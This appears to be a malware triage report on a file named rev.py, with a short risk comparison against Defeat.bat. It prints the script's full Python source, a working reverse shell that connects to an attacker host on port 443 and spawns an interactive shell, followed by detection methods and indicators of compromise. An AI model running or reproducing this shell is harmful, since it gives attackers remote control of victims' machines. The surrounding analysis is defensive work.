Python script (identified by .py extension and Python syntax)
Code Analysis:


import socket
import subprocess
import os

hacker_ip = "192.168.45.205"  # Attacker's C2 server
port = 443  # HTTPS port for stealth

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((hacker_ip, port))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])





Malicious Behavior:
Reverse shell implementation that:

Creates connection back to attacker (192.168.45.205)

Uses port 443 (common for C2 to blend with HTTPS traffic)

Duplicates file descriptors to redirect I/O

Spawns interactive shell (/bin/sh -i)

Detection Methods:

Network monitoring for unexpected outbound connections to 192.168.45.205:443

Process monitoring for Python spawning shells

File integrity monitoring for new Python scripts

EDR solutions watching for socket+subprocess combinations

Key Indicators:
Attacker IP: 192.168.45.205

C2 Port: 443 (HTTPS)

Payload: Interactive reverse shell





Immediate escalation because:

Confirmed malicious behavior (reverse shell)

Active C2 infrastructure identified

High impact potential (remote code execution)

Comparative Risk Assessment
File	Risk Level	Reason for Escalation
Defeat.bat	Medium	Unknown purpose, needs deep analysis
rev.py	Critical	Confirmed reverse shell implant
